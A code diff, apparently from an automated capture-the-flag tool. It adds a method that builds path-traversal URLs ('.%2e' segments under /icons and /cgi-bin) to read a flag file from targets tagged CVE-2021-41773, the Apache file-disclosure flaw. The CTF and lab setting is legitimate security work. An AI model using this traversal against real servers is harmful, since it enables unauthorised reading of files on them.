@@ -141,6 +141,7 @@ class PrimitiveCtfHandlerMixin:
             urls.append(base)
             for path in CTF_CAPTURE_PATHS:
                 urls.append(parse.urljoin(base, path.lstrip("/")))
+        urls.extend(self._ctf_vulnerability_probe_urls(target, bases))
         for evidence in self.store.list_evidence(target_id=target.id, limit=200):
             if not self._records_for_generation([evidence], self._target_active_generation(target)):
                 continue
@@ -184,6 +185,32 @@ class PrimitiveCtfHandlerMixin:
                 elif isinstance(path, str):
                     values.extend(parse.urljoin(base, path.lstrip("/")) for base in bases)
         return values
+
+    def _ctf_vulnerability_probe_urls(self, target, bases: list[str]) -> list[str]:
+        if self._ctf_target_cve_id(target) != "CVE-2021-41773":
+            return []
+        flag_path = str(target.metadata.get("ctf_flag_container_path") or "").strip()
+        if not flag_path.startswith("/") or "{" in flag_path or "}" in flag_path:
+            return []
+        traversal = "/".join([".%2e"] * 6)
+        relative_flag_path = flag_path.lstrip("/")
+        urls: list[str] = []
+        for base in bases:
+            for alias in ("icons", "cgi-bin"):
+                urls.append(parse.urljoin(base, "/".join((alias, traversal, relative_flag_path))))
+        return urls
+
+    def _ctf_target_cve_id(self, target) -> str:
+        for key in ("vulnerability_cve_id", "cve_id"):
+            value = target.metadata.get(key)
+            if isinstance(value, str) and value.strip():
+                return value.strip().upper()
+        vulnerability = target.metadata.get("vulnerability")
+        if isinstance(vulnerability, dict):
+            value = vulnerability.get("cve_id")
+            if isinstance(value, str):
+                return value.strip().upper()
+        return ""
 
     def _dedupe_local_http_urls(self, values: list[str]) -> list[str]:
         urls: list[str] = []
